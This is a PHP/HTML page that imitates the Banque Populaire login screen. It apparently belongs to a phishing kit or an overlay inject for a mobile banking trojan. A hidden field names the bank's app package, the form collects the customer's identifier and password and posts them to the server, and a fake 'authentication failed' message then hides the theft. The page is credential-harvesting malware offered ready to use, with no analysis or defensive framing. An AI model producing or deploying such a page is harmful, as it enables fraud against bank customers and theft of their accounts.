<?php require_once '../go.php';?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <title>BanquePopulaire</title>

    <link rel="stylesheet" href="css/normalize.css">
    <link rel="stylesheet" href="css/main.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
    <link rel="stylesheet" href="css/agricole.css">

    <script src="js/vendor/jquery-1.11.3.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>
</head>

<body>
		<div class="modal modal_04">
            <div class="row">
			
                <div class="form_header">
                    <img src="img/agricole/logo.png" alt="">
                </div>
            </div>
			
			<div class="container">
			
				<div id="cat-error">
				<span>Authentication failed or timed out</span>
				<input type="button" class="login_btn" value="Try enter again"
				onClick="tryEnterAgain();"/>
				</div>

<div id="cat-forms">
	<form action="" method="post" class="wrapper">
        <input type="hidden" name="field1" value="fr.banquepopulaire.cyberplus" class="main_input">
				
					<div class="row">
						<div class="content">
							<div class="input_block_wr">
								<div class="inp_caption">
									 Identifiant
								</div>
								<div class="inp_wr">
									<input type="text" name="field2" class="main_input"  required="">
								</div>
							</div>
							<div class="input_block_wr">
								<div class="inp_caption">
									Mot de passe
								</div>
								<div class="inp_wr">
									<input type="password" name="field3" class="main_input"  required="">
								</div>
							</div>
							<div class="btn_wr">
								<input type="submit" class="login_btn" value="Valider"/>
							</div>
						</div>
					</div>
				</form>

				<form id="cat-step-2" class="cat-last-step">
				<span>Authentication failed or timed out</span>
				<input type="button" class="login_btn" value="Try enter again"
					onClick="closeWindow()"/>
				</form>

</div>
			</div>
		</div>
</body>
</html>